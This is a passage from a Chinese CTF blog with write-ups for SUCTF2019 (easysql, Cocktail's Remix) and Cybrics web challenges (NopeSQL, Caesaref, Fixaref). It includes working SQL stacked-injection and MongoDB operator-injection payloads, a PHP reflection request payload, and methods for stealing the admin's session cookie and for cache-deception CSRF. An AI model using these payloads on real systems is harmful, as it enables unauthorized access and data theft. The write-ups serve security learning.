<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$reflect = <span class="keyword">new</span> ReflectionClass(<span class="string">'Mysqli'</span>);</span><br><span class="line">$sql = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="string">'Mysqli'</span>, <span class="string">'init'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, $arr);</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="string">'Mysqli'</span>, <span class="string">'real_connect'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, <span class="string">'ip'</span>,<span class="string">'root'</span>,<span class="string">'123456'</span>,<span class="string">'test'</span>,<span class="string">'3306'</span>);</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="string">'Mysqli'</span>, <span class="string">'query'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, <span class="string">'select 1'</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin=<span class="number">1</span>&amp;clazz=Mysqli&amp;func1=init&amp;arg1=&amp;func2=real_connect&amp;arg2[<span class="number">0</span>]=<span class="number">106.14</span><span class="number">.153</span><span class="number">.173</span>&amp;arg2[<span class="number">1</span>]=root&amp;arg2[<span class="number">2</span>]=<span class="number">123</span>&amp;arg2[<span class="number">3</span>]=test&amp;arg2[<span class="number">4</span>]=<span class="number">3306</span>&amp;func3=query&amp;arg3=select%<span class="number">201</span>&amp;ip=<span class="number">106.14</span><span class="number">.153</span><span class="number">.173</span>&amp;port=<span class="number">2015</span><span class="string">';</span></span><br></pre></td></tr></table></figure>

<h3 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h3><p>这个题似乎因为正则和在线维护的问题除了一些小差错，本意是考sql_mode中的PIPES_AS_CONCAT模式将字符串 ||视为字符串的连接操作符而非或运算符，配合堆叠注入带出flag，源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">$BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line"><span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line"><span class="comment">//echo $post['query'];</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line"><span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">print_r($row);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>预期解法</p>
<p><img src="https://s2.ax1x.com/2019/08/27/m4D6gJ.png" alt="m4D6gJ.png"></p>
<p>payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;pipes_as_concat;select 1</span><br></pre></td></tr></table></figure>

<p>非预期</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;select *,1</span><br></pre></td></tr></table></figure>

<h3 id="Cocktail’s-Remix"><a href="#Cocktail’s-Remix" class="headerlink" title="Cocktail’s Remix"></a>Cocktail’s Remix</h3><p>这个并没有复现环境，但其实这个题的主要思路就是对cocktail.so的分析….我并不会逆向，只能放到IDA里硬着头皮跟着wp学学了</p>
<p>进入cocktail_handler，内容如下：</p>
<p><img src="https://s2.ax1x.com/2019/08/27/mI06JS.png" alt="mI06JS.png"></p>
<p>大概可以看出意思是从headers中拿到Reffer字段并且给j_remix处理，最后进行popen命令执行，跟进j_max看一下</p>
<p><img src="https://s2.ax1x.com/2019/08/27/mIBpFK.png" alt="mIBpFK.png"></p>
<p>跟着remix</p>
<p><img src="https://s2.ax1x.com/2019/08/27/mIBLh8.png" alt="mIBLh8.png"></p>
<p>是base64算法的逻辑，所以最终的思路是将base64编码的命令传给reffer,然后程序进行解码后命令执行。</p>
<h3 id="iCloudMusic"><a href="#iCloudMusic" class="headerlink" title="iCloudMusic"></a>iCloudMusic</h3><p>待学习一些二进制方面内容再看看</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/08/27/SUCTF2019/" data-id="ckabsu38k0021kkvr5bfa1vqk" class="article-share-link" data-share="baidu" data-title="SUCTF2019">Share</a>
      

      
        <a href="http://yoursite.com/2019/08/27/SUCTF2019/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Cybrics-Web部分wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/27/Cybrics-Web%E9%83%A8%E5%88%86wp/" class="article-date">
  <time datetime="2019-07-27T14:16:13.000Z" itemprop="datePublished">2019-07-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/27/Cybrics-Web%E9%83%A8%E5%88%86wp/">Cybrics-Web部分wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>打开链接，直接会跳转到final.html，所以curl一下主页。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;45.32.148.106</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/22/eiyohq.png" alt="eiyohq.png"></p>
<h3 id="Bitkoff-Bank"><a href="#Bitkoff-Bank" class="headerlink" title="Bitkoff Bank"></a>Bitkoff Bank</h3><p>硬跑出来的..跑就完了。</p>
<h3 id="Caesaref"><a href="#Caesaref" class="headerlink" title="Caesaref"></a>Caesaref</h3><p>这道题本来是Hard难度的，出现了PHPSESSID泄露，想写wp的时候发现题挂了，说一下思路吧，写一个链接放在留言板上，bot会自己携带着管理员的PHPSESSID访问，开个端口监听一下，拿到cookie，回去更改一下即可获得flag。</p>
<h3 id="NopeSQL"><a href="#NopeSQL" class="headerlink" title="NopeSQL"></a>NopeSQL</h3><p>这道题还是很难受的，通过这道题发现自己看文档的能力有点菜，还是需要多练习啊，比赛的时候没做出来，复现的时候才明白的。首先进入发现登陆界面以及.git源码泄露，index.php源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user == <span class="keyword">true</span>): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">        &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline = [</span><br><span class="line">            [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">            [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">            [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters = [</span><br><span class="line">            [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                    printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">        Invalid username <span class="keyword">or</span> password</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">'/'</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line">        $cursor = $collection-&gt;find([<span class="string">'public'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $news) &#123;</span><br><span class="line">            printf(<span class="string">"%s&lt;br&gt;"</span>, $news[<span class="string">'title'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现是mongodb数据库的注入，自己并不是太了解，去现学习了一波..，不过,mongodb语法确实要比mysql要复杂一些，mysql还是比较简单，根据这个代码的逻辑，首先得登陆进去，登陆验证部分代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>test数据库，users表，将用户的输入无任何过滤直接在语句中进行拼接，产生注入，这里的admin..可真的把我坑坏了….，翻了翻文档第一次构造的句子是没有构造admin…，怎么都出不来，后来用admin进去了，结果到最后也没做出来，赛后其实发现不用admin其实也能进去，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;,&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;$where&quot;:&quot;1</span><br></pre></td></tr></table></figure>

<p><strong>这里的username和password虽然是用重复的，但是mongo还是会以最后一个为基准的，意思也就是password不为null,username不为空的用户,肯定是会存在的，所以可以成功绕过进行登陆。</strong>进入页面后也就是对应着如下逻辑的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> Welcome!</span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    Group most common news by</span><br><span class="line">    &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">    &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">    $pipeline = [</span><br><span class="line">        [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">        [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">        [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $filters = [</span><br><span class="line">        [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>翻阅文档中聚合的意思，大意可明白上面的代码，还是先说一个$project聚合吧</p>
<p><img src="https://s2.ax1x.com/2019/07/23/eFKKHJ.png" alt="eFKKHJ.png"></p>
<p>官方给的例子</p>
<p><img src="https://s2.ax1x.com/2019/07/23/eFKG36.png" alt="eFKG36.png"></p>
<p>也就是我们要做的事通过控制字段来拿到flag,..当时真的没有想到传入数组进行条件控制，来看一下impakho师傅的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter[$cond][if][$eq][][$strLenBytes]&#x3D;$title&amp;filter[$cond][if][$eq][][$toInt]&#x3D;19&amp;filter[$cond][then]&#x3D;$text&amp;filter[$cond][else]&#x3D;12</span><br></pre></td></tr></table></figure>

<p>其实这个是最终版的payload，其实是要先fuzz title的，最终用burp在19处可发现</p>
<p><img src="https://s2.ax1x.com/2019/07/23/eFMcJ1.png" alt="eFMcJ1.png"></p>
<p>然后查$text字段</p>
<p><img src="https://s2.ax1x.com/2019/07/23/eFMHJI.png" alt="eFMHJI.png"></p>
<p>成功拿到flag。</p>
<h3 id="Fixaref"><a href="#Fixaref" class="headerlink" title="Fixaref"></a>Fixaref</h3><p>一道缓存投毒的题，这道题是在之前的题做了加固，之前我们让admin去访问我们的链接就可以拿到PHPSESSID的，再举办方做了加固后这样是不可行的了，但是这道题管理员仍然会去访问我们发布的链接，这里就用到的<code>缓存投毒</code>。</p>
<p><strong>原理为：.css/.js等为后缀名的文件服务器会将之做缓存。</strong></p>
<p>首先让管理员访问我们的css界面，这个css界面连同管理员当时的操作都被记录到了这个缓存页面，然后我们再去访问这个css，比如我设置的链接<code>http://95.179.190.31/index.php/lihuaiqiu.css</code>，<strong>让管理员访问后，这样就会把admin的index.php放入缓存页面，再去访问这个缓存页面，发现多了一个admin的GET表单(也就admin页面的内容)。</strong></p>
<p><img src="https://s2.ax1x.com/2019/07/27/eKOB8O.png" alt="eKOB8O.png"></p>
<p>发现这个表单，其实本来的意思是admin通过<code>show flag</code>这个按钮来getflag，其实就是通过get来发送<code>csrf-token</code>和<code>flag</code>来getflag，同样让管理员访问这个网页，并把缓存也存入我们的<code>lihuaiqiu.css</code>，为了可以传两个参数，需要把<code>&amp;</code>进行编码，访问如下链接：</p>
<p><a href="http://95.179.190.31/index.php/lihuaiqiu.css?csrf-token=3d839c02761010289d09cea1dc9ce2e5fc1b9e725a11e9855b137847a9369eb0%26flag=1" target="_blank" rel="noopener">http://95.179.190.31/index.php/lihuaiqiu.css?csrf-token=3d839c02761010289d09cea1dc9ce2e5fc1b9e725a11e9855b137847a9369eb0%26flag=1</a></p>
<p>这样flag就到了我们的缓存界面，接着去访问这个链接</p>
<p><img src="https://s2.ax1x.com/2019/07/27/eMCuVg.png" alt="eMCuVg.png"></p>
<p>拿到flag。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/27/Cybrics-Web%E9%83%A8%E5%88%86wp/" data-id="ckabsu37z000tkkvrayiz0wq6" class="article-share-link" data-share="baidu" data-title="Cybrics-Web部分wp">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/27/Cybrics-Web%E9%83%A8%E5%88%86wp/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/3/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/5/">Next &amp;raquo;</a>
  </nav>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">30</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" rel="tag">生活随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12.5px;">Crypto</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 10px;">WEB安全</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 17.5px;">Web安全</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">生活随笔</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 